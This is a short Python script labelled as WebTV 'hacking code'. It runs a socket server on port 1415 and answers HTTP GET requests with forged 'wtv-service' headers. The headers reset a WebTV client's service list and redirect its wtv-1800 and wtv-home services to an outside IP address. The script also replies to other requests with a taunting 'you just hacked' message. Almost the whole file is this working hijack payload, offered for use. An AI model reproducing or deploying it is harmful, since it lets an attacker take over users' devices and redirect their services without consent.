# Webtv fuc... hacking code

import socket
import threading

# Create server socket
sock = socket.socket()
sock.bind(('', 1415))
sock.listen(1024)

hack_data = """
<h1>Please wait while your webtv load custom service</h1>
"""

hack = f"""
HTTP/1.1 200 OK
Server: Webtv fuc...hacking
Content-Type: text/html
Content-Length: {len(hack_data)}
wtv-service: reset
wtv-service: name=wtv-1800 host=185.17.3.17 port=1415
wtv-service: name=wtv-home host=185.17.3.17 port=1415

{hack_data}
"""

def handler(sock: socket.socket):
    # Handle request
    data = sock.recv(1024)
    # Is this is a http?
    if data.startswith(b'GET /'):
        # Return hacking data
        sock.send(hack.encode())
    else:
        # Return other data
        sock.send("400 Hello, this is not fake, you just hacked, restart your webtv\nContent-Type: text/html\nContent-Length: 0\n\n".encode())
    sock.close()

# Wait for connection
while True:
    conn, addr = sock.accept()
    threading.Thread(target=handler, args=(conn,)).start() # Start thread handler